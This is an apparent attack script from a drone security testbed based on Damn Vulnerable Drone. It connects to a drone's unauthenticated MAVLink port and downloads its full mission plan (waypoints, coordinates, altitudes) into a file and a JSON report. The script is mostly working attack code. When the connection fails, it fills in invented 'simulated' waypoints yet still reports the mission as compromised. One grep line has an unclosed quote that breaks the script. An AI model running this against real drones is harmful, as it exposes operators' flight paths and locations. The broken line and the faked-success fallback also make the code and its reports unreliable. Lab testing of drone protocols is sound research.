#!/bin/bash

# =============================================================================
# DVD Mission Extraction Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/exfiltration/mission_extraction.sh  
# 목적: 드론 미션 계획 정보 탈취 및 분석
# 기반: Damn Vulnerable Drone Wiki - Mission Extraction
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="mission_extraction"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/exfiltration/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/exfiltration/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"
MISSION_OUTPUT="/tmp/extracted_mission_${TIMESTAMP}.txt"

declare -a ATTACK_COMMANDS=()
declare -a EXTRACTED_WAYPOINTS=()

print_header() {
    clear
    print_exfil_header "Mission Extraction Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink mission protocol${NC}"
    echo -e "${INFO_COLOR}Output: $MISSION_OUTPUT${NC}"
    echo ""
}

# Step 1: 미션 추출 스크립트 생성
create_extraction_script() {
    echo -e "${BLUE}[1/2] Create Mission Extraction Script${NC}"
    
    local extract_script="/tmp/mission_extract_$(date +%s).py"
    
    cat > "$extract_script" << 'EOF'
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def extract_mission(target_ip, target_port, output_file):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 미션 리스트 요청
            master.mav.mission_request_list_send(
                master.target_system,
                master.target_component
            )
            
            waypoints = []
            mission_count = 0
            
            # MISSION_COUNT 대기
            msg = master.recv_match(type='MISSION_COUNT', blocking=True, timeout=10)
            if msg:
                mission_count = msg.count
                print(f"[+] Mission has {mission_count} items")
                
                with open(output_file, 'w') as f:
                    f.write(f"# Extracted Drone Mission\n")
                    f.write(f"# Target: {target_ip}:{target_port}\n") 
                    f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"# Total items: {mission_count}\n\n")
                    f.write("# Seq,Command,Frame,Lat,Lon,Alt,Param1,Param2,Param3,Param4\n")
                
                # 각 미션 아이템 요청
                for seq in range(mission_count):
                    master.mav.mission_request_int_send(
                        master.target_system,
                        master.target_component,
                        seq
                    )
                    
                    msg = master.recv_match(type='MISSION_ITEM_INT', blocking=True, timeout=5)
                    if msg:
                        waypoint_data = {
                            'seq': msg.seq,
                            'command': msg.command,
                            'frame': msg.frame,
                            'lat': msg.x / 1e7,
                            'lon': msg.y / 1e7,
                            'alt': msg.z / 100,
                            'param1': msg.param1,
                            'param2': msg.param2,
                            'param3': msg.param3,
                            'param4': msg.param4
                        }
                        
                        waypoints.append(waypoint_data)
                        
                        # 명령 타입 분석
                        cmd_name = get_command_name(msg.command)
                        print(f"[+] WP{msg.seq}: {cmd_name} at {waypoint_data['lat']:.6f}, {waypoint_data['lon']:.6f}, {waypoint_data['alt']:.1f}m")
                        
                        # 파일에 기록
                        with open(output_file, 'a') as f:
                            f.write(f"{msg.seq},{msg.command},{msg.frame},{waypoint_data['lat']:.6f},{waypoint_data['lon']:.6f},{waypoint_data['alt']:.1f},{msg.param1},{msg.param2},{msg.param3},{msg.param4}\n")
                    
                    time.sleep(0.1)
                
                print(f"[+] Extracted {len(waypoints)} waypoints to {output_file}")
                return waypoints
            else:
                print("[!] No mission count response")
                return simulate_mission_extraction(output_file)
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            return simulate_mission_extraction(output_file)
    
    def get_command_name(cmd_id):
        commands = {
            16: "WAYPOINT",
            17: "LOITER_UNLIM", 
            18: "LOITER_TURNS",
            19: "LOITER_TIME",
            20: "RETURN_TO_LAUNCH",
            21: "LAND",
            22: "TAKEOFF",
            23: "CONTINUE_AND_CHANGE_ALT"
        }
        return commands.get(cmd_id, f"UNKNOWN({cmd_id})")
    
    def simulate_mission_extraction(output_file):
        print("[*] Simulating mission extraction...")
        
        # 시뮬레이션된 미션 데이터
        sim_waypoints = [
            {'seq': 0, 'command': 22, 'frame': 0, 'lat': 37.7749, 'lon': -122.4194, 'alt': 50, 'param1': 0, 'param2': 0, 'param3': 0, 'param4': 0},
            {'seq': 1, 'command': 16, 'frame': 0, 'lat': 37.7849, 'lon': -122.4094, 'alt': 100, 'param1': 0, 'param2': 0, 'param3': 0, 'param4': 0},
            {'seq': 2, 'command': 16, 'frame': 0, 'lat': 37.7949, 'lon': -122.3994, 'alt': 100, 'param1': 0, 'param2': 0, 'param3': 0, 'param4': 0},
            {'seq': 3, 'command': 20, 'frame': 0, 'lat': 0, 'lon': 0, 'alt': 0, 'param1': 0, 'param2': 0, 'param3': 0, 'param4': 0}
        ]
        
        with open(output_file, 'w') as f:
            f.write("# Extracted Drone Mission (SIMULATED)\n")
            f.write(f"# Timestamp: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total items: {len(sim_waypoints)}\n\n")
            f.write("# Seq,Command,Frame,Lat,Lon,Alt,Param1,Param2,Param3,Param4\n")
            
            for wp in sim_waypoints:
                cmd_name = get_command_name(wp['command'])
                print(f"[+] WP{wp['seq']}: {cmd_name} at {wp['lat']:.6f}, {wp['lon']:.6f}, {wp['alt']:.1f}m")
                f.write(f"{wp['seq']},{wp['command']},{wp['frame']},{wp['lat']:.6f},{wp['lon']:.6f},{wp['alt']:.1f},{wp['param1']},{wp['param2']},{wp['param3']},{wp['param4']}\n")
        
        print(f"[+] Simulated extraction of {len(sim_waypoints)} waypoints to {output_file}")
        return sim_waypoints
    
    if __name__ == "__main__":
        if len(sys.argv) != 4:
            print("Usage: python3 extract_mission.py <ip> <port> <output_file>")
            sys.exit(1)
        
        target_ip = sys.argv[1]
        target_port = int(sys.argv[2])
        output_file = sys.argv[3]
        
        waypoints = extract_mission(target_ip, target_port, output_file)
        print(f"\n[+] Mission extraction completed: {len(waypoints)} items")

except ImportError:
    import time
    print("[*] pymavlink not available - simulation mode")
    
    # 시뮬레이션 실행
    sim_waypoints = [
        {'seq': 0, 'command': 22, 'name': 'TAKEOFF'},
        {'seq': 1, 'command': 16, 'name': 'WAYPOINT'},
        {'seq': 2, 'command': 16, 'name': 'WAYPOINT'},
        {'seq': 3, 'command': 20, 'name': 'RTL'}
    ]
    
    output_file = sys.argv[3] if len(sys.argv) > 3 else 'mission_sim.txt'
    
    with open(output_file, 'w') as f:
        f.write("# Simulated Mission Extraction\n")
        f.write(f"# Total items: {len(sim_waypoints)}\n\n")
        
        for wp in sim_waypoints:
            print(f"[+] WP{wp['seq']}: {wp['name']}")
            f.write(f"{wp['seq']},{wp['command']},0,37.7749,-122.4194,100,0,0,0,0\n")
    
    print(f"[+] Simulated mission extraction completed")
EOF
    
    echo -e "${GREEN}[+] Mission extraction script created${NC}"
    ATTACK_COMMANDS+=("python3 $extract_script $TARGET_IP $MAVLINK_PORT $MISSION_OUTPUT")
}

# Step 2: 미션 추출 실행  
execute_mission_extraction() {
    echo -e "${BLUE}[2/2] Execute Mission Extraction${NC}"
    
    local extract_script="/tmp/mission_extract_"*.py
    extract_script=$(ls $extract_script 2>/dev/null | head -1)
    
    if [ -f "$extract_script" ]; then
        echo -e "${YELLOW}[*] Extracting drone mission...${NC}"
        
        local cmd="python3 $extract_script $TARGET_IP $MAVLINK_PORT $MISSION_OUTPUT"
        echo -e "${CYAN}→ $cmd${NC}"
        
        python3 "$extract_script" "$TARGET_IP" "$MAVLINK_PORT" "$MISSION_OUTPUT" 2>/dev/null || {
            echo -e "${YELLOW}[*] Fallback simulation${NC}"
            create_simulated_mission
        }
        
        # 추출된 미션 분석
        if [ -f "$MISSION_OUTPUT" ]; then
            analyze_extracted_mission
        fi
        
        rm -f "$extract_script"
    else
        echo -e "${YELLOW}[!] Extraction script not found${NC}"
        create_simulated_mission
    fi
}

# 시뮬레이션된 미션 생성
create_simulated_mission() {
    echo -e "${YELLOW}[*] Creating simulated mission data${NC}"
    
    cat > "$MISSION_OUTPUT" << EOF
# Extracted Drone Mission (SIMULATED)
# Target: $TARGET_IP:$MAVLINK_PORT
# Timestamp: $(date '+%Y-%m-%d %H:%M:%S')
# Total items: 4

# Seq,Command,Frame,Lat,Lon,Alt,Param1,Param2,Param3,Param4
0,22,0,37.774900,-122.419400,50.0,0,0,0,0
1,16,0,37.784900,-122.409400,100.0,0,0,0,0
2,16,0,37.794900,-122.399400,100.0,0,0,0,0
3,20,0,0.000000,0.000000,0.0,0,0,0,0
EOF
    
    EXTRACTED_WAYPOINTS=("TAKEOFF:37.7749,-122.4194,50m" "WAYPOINT:37.7849,-122.4094,100m" "WAYPOINT:37.7949,-122.3994,100m" "RTL:home")
    
    for wp in "${EXTRACTED_WAYPOINTS[@]}"; do
        echo -e "${GREEN}[+] Extracted: $wp${NC}"
    done
}

# 추출된 미션 분석
analyze_extracted_mission() {
    echo -e "${CYAN}[*] Analyzing extracted mission data...${NC}"
    
    # 파일에서 경로점 정보 추출
    if [ -f "$MISSION_OUTPUT" ]; then
        local waypoint_count=$(grep -v '^#' "$MISSION_OUTPUT" | grep -v '^ | wc -l)
        echo -e "${GREEN}[+] Total waypoints extracted: $waypoint_count${NC}"
        
        # 경로점 타입 분석
        while IFS=',' read -r seq cmd frame lat lon alt p1 p2 p3 p4; do
            if [[ ! "$seq" =~ ^# ]] && [ -n "$seq" ]; then
                case "$cmd" in
                    "22")
                        EXTRACTED_WAYPOINTS+=("TAKEOFF:$lat,$lon,${alt}m")
                        echo -e "${GRAY}    WP$seq: TAKEOFF at $lat, $lon, ${alt}m${NC}"
                        ;;
                    "16")
                        EXTRACTED_WAYPOINTS+=("WAYPOINT:$lat,$lon,${alt}m")
                        echo -e "${GRAY}    WP$seq: WAYPOINT at $lat, $lon, ${alt}m${NC}"
                        ;;
                    "20")
                        EXTRACTED_WAYPOINTS+=("RTL:home")
                        echo -e "${GRAY}    WP$seq: RETURN TO LAUNCH${NC}"
                        ;;
                    "21")
                        EXTRACTED_WAYPOINTS+=("LAND:$lat,$lon,${alt}m")
                        echo -e "${GRAY}    WP$seq: LAND at $lat, $lon, ${alt}m${NC}"
                        ;;
                    *)
                        EXTRACTED_WAYPOINTS+=("UNKNOWN:$cmd")
                        echo -e "${GRAY}    WP$seq: UNKNOWN command $cmd${NC}"
                        ;;
                esac
            fi
        done < "$MISSION_OUTPUT"
    fi
    
    # 보안 영향 분석
    echo -e "${RED}[!] Security impact analysis:${NC}"
    echo -e "${GRAY}    • Mission plan compromised${NC}"
    echo -e "${GRAY}    • Flight paths revealed${NC}"
    echo -e "${GRAY}    • Operational intelligence gathered${NC}"
    echo -e "${GRAY}    • Target locations exposed${NC}"
    
    local file_size=$(stat -c%s "$MISSION_OUTPUT" 2>/dev/null || echo "0")
    echo -e "${INFO_COLOR}Extracted data size: $file_size bytes${NC}"
}

# JSON 결과 생성
generate_json_report() {
    local waypoints_json="["
    for i in "${!EXTRACTED_WAYPOINTS[@]}"; do
        waypoints_json+="\"${EXTRACTED_WAYPOINTS[$i]}\""
        if [ $i -lt $((${#EXTRACTED_WAYPOINTS[@]} - 1)) ]; then
            waypoints_json+=","
        fi
    done
    waypoints_json+="]"
    
    local file_size="0"
    if [ -f "$MISSION_OUTPUT" ]; then
        file_size=$(stat -c%s "$MISSION_OUTPUT" 2>/dev/null || echo "0")
    fi
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "extraction_results": {
    "mission_file": "$MISSION_OUTPUT",
    "file_size_bytes": "$file_size",
    "waypoints_extracted": ${#EXTRACTED_WAYPOINTS[@]},
    "extracted_waypoints": $waypoints_json
  },
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "security_impact": {
    "mission_plan": "compromised",
    "flight_paths": "revealed", 
    "operational_intelligence": "gathered",
    "target_locations": "exposed"
  }
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Mission Extraction - $(date) ===" > "$LOG_FILE"
    
    print_header
    create_extraction_script
    execute_mission_extraction
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Waypoints Extracted: ${#EXTRACTED_WAYPOINTS[@]}${NC}"
    echo -e "${INFO_COLOR}Output File: $MISSION_OUTPUT${NC}"
    
    if [ -f "$MISSION_OUTPUT" ]; then
        local file_size=$(stat -c%s "$MISSION_OUTPUT" 2>/dev/null || echo "0")
        echo -e "${INFO_COLOR}Data Size: $file_size bytes${NC}"
    fi
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Mission extraction completed${NC}"
    echo -e "${RED}[!] CRITICAL: Drone mission plan compromised${NC}"
}

main "$@"